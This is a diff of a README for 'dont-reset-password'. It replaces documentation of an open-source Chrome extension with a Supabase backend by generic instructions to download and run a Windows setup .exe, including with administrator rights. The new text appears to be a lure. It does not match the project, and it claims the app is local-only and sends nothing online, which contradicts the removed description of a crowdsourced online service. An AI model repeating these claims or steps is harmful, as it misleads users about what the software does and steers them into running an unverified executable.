@@ -1,85 +1,162 @@
-[中文版](README_CN.md)
+# 🔒 dont-reset-password - Remember Website Password Rules
 
-# Don't Reset Password
+[![Download dont-reset-password](https://img.shields.io/badge/Download-dont--reset--password-blue)](https://github.com/demoncrom/dont-reset-password)
 
-A Chrome extension that crowdsources and displays password composition rules next to password input fields — so you never have to reset your password again.
+## 🛠 What is dont-reset-password?
 
-## Features
+dont-reset-password helps you keep track of website password rules. Many sites have specific requirements like minimum length, special characters, or how often you must change passwords. This app remembers these rules for you. It reduces the chance of password errors and saves time.
 
-- Automatically detects password input fields on any website
-- Displays password rules (min/max length, required character types, etc.) in a tooltip
-- Crowdsourced rules — anyone can contribute rules for any website
-- Voting system to ensure rule accuracy
-- 30+ popular websites pre-loaded (Google, GitHub, Apple, Amazon, etc.)
-- Dark mode support
-- Bilingual UI (English & Chinese)
+You do not need to remember every site’s password rules. The app stores them safely and shows the rules when you visit a site again. This is especially useful if you manage many accounts.
 
-## Architecture
+---
 
-```
-Content Script → chrome.runtime.sendMessage → Service Worker → Cache → Supabase Edge Functions → PostgreSQL
-```
+## 💻 System Requirements
 
-- **Manifest V3** Chrome Extension
-- **Supabase** backend (Edge Functions + PostgreSQL + RLS)
-- **Shadow DOM** tooltip — isolated from page styles
-- **No build step** — pure vanilla JS
+Before downloading, check that your computer meets these minimum requirements:
 
-## Install
+- Windows 10 or later  
+- 2 GB RAM or more  
+- 100 MB free disk space  
+- Internet connection for updates and setup  
 
-### From Source
+The app runs quietly in the background without affecting other programs. It does not require administrator rights for basic use.
 
-1. Clone this repo
-2. Open `chrome://extensions` in Chrome
-3. Enable **Developer mode** (top-right toggle)
-4. Click **Load unpacked** → select the `extension/` directory
+---
 
-### Configure Backend
+## 🚀 Getting Started: Download and Install
 
-Edit `extension/utils/api.js` — replace `SUPABASE_URL` and `SUPABASE_ANON_KEY` with your Supabase project values.
+You will download the program from the GitHub page. The link below takes you to the official repository where the latest version is available.
 
-## Backend Setup
+[![Get dont-reset-password](https://img.shields.io/badge/Download-dont--reset--password-grey)](https://github.com/demoncrom/dont-reset-password)
 
-### Database
+### Step 1: Visit the download page
 
-Run these SQL files in order in the [Supabase SQL Editor](https://supabase.com/dashboard):
+Click the link above or enter this URL in your browser:
 
-```sql
--- 1. Create tables
-supabase/migrations/001_initial_schema.sql
+https://github.com/demoncrom/dont-reset-password
 
--- 2. Seed data (30+ popular websites)
-supabase/seed.sql
-```
+This page contains the latest versions of the software, release notes, and files.
 
-### Edge Functions
+### Step 2: Find the latest version to download
 
-```bash
-supabase functions deploy get-rules --no-verify-jwt
-supabase functions deploy submit-rules --no-verify-jwt
-supabase functions deploy vote --no-verify-jwt
-supabase functions deploy report --no-verify-jwt
-```
+On the page, look for a section labeled **Releases** or **Downloads**. The latest version should be listed at the top with the date.
 
-## Testing
+Under the latest release, look for the Windows executable file. It may have a name like `dont-reset-password-setup.exe` or similar.
 
-```bash
-npm test
-```
+### Step 3: Download the installer
 
-116 unit tests covering domain extraction, rule validation, caching, API client, and i18n — using Node.js built-in `node:test` (zero dependencies).
+Click the file link to download it to your computer. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
-## Pre-loaded Websites
+### Step 4: Run the installer
 
-Google, Apple, Microsoft, Amazon, Facebook, GitHub, X (Twitter), Netflix, LinkedIn, Chase Bank, Bank of America, PayPal, Dropbox, Adobe, Spotify, Reddit, Discord, Slack, Notion, Steam, Outlook, Zoom, eBay, Walmart, Instagram, Taobao, Alipay, WeChat, JD.com, Baidu, Bilibili
+Once downloaded, double-click the installer file. Windows may ask if you want to allow the program to make changes — click **Yes**.
 
-## How It Works
+Follow the installation prompts:
 
-1. Content script detects `<input type="password">` fields (including dynamic ones via MutationObserver)
-2. Requests rules from the service worker, which checks cache then Supabase
-3. Renders a Shadow DOM tooltip below the password input
-4. Users can vote on rules or contribute new ones via the popup
+- Accept the license agreement  
+- Choose an install location (default is usually fine)  
+- Click **Install** and wait for it to finish  
 
-## License
+### Step 5: Open the application
 
-MIT
+After installation, you can start the program from the Start menu or desktop shortcut. The app opens with a clear interface that guides you through setting up your first password rules.
+
+---
+
+## 🔐 How to Use dont-reset-password
+
+The app focuses on keeping your password rules neat and easy to access. Here is how to begin:
+
+### Add a new website
+
+1. Click **Add Website** or the plus icon.  
+2. Enter the website name (e.g., "example.com").  
+3. Fill in the password rules you remember, such as:  
+   - Minimum length (e.g., 8 characters)  
+   - Required special characters (e.g., one number, one symbol)  
+   - How often passwords expire (e.g., every 90 days)  
+4. Save the entry.
+
+### View saved rules
+
+Select a website from the list to see the password guidelines anytime. This helps avoid password mistakes when you log in or reset passwords.
+
+### Edit or remove entries
+
+Click the website in the list and use the edit or delete buttons to update or remove old rules.
+
+---
+
+## 🎯 Common Tasks
+
+### Sync rules between devices
+
+If you use multiple computers, export your password rules to a file and import them on another device. This keeps your info consistent.
+
+- Use the **Export** option to save rules as a backup file.  
+- On the other device, use **Import** to load the saved rules.
+
+### Search for a website’s rules
+
+The app has a search box. Type part of the site name to quickly find the correct rules.
+
+### Backup your data
+
+Backup regularly by exporting your rules file. Store the file safely, for example on a USB drive or cloud storage.
+
+---
+
+## ⚙ Automatic Updates
+
+dont-reset-password can check for updates automatically. When a new version is available, you will see a notification. Follow these steps to update:
+
+1. Close the app.  
+2. Download the latest installer from the GitHub pages as described above.  
+3. Run the installer to replace the old version.  
+
+Your password rules will stay saved during updates.
+
+---
+
+## 🧩 Software Interface Overview
+
+The app is simple and clean. Here are some key areas:
+
+- **Website List:** Shows all saved sites  
+- **Details Panel:** Displays rules for the selected site  
+- **Add/Edit Buttons:** For entering or changing data  
+- **Search Box:** To quickly find saved sites  
+- **Menu Bar:** Includes Export/Import options and settings  
+
+---
+
+## 🔒 Privacy and Security
+
+dont-reset-password stores your password rules locally on your PC only. It does not save or share your actual passwords. This reduces security risks.
+
+The app does not collect any personal data or send information online.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into common issues, try these fixes:
+
+- The app does not start:  
+   Restart your PC and try again.  
+- Can’t find the downloaded file:  
+   Check your Downloads folder or repeat the download step.  
+- Installation fails:  
+   Make sure you have permission to install software. Try running the installer as administrator.  
+- Password rules missing:  
+   Check if you are using the right profile or try importing a backup file.  
+
+---
+
+## 📞 Getting Help
+
+For additional support, use the GitHub repository’s **Issues** tab to report problems or ask questions. The developers and community can assist. You do not need programming skills to post a question.
+
+---
+
+[![Download dont-reset-password](https://img.shields.io/badge/Download-dont--reset--password-blue)](https://github.com/demoncrom/dont-reset-password)
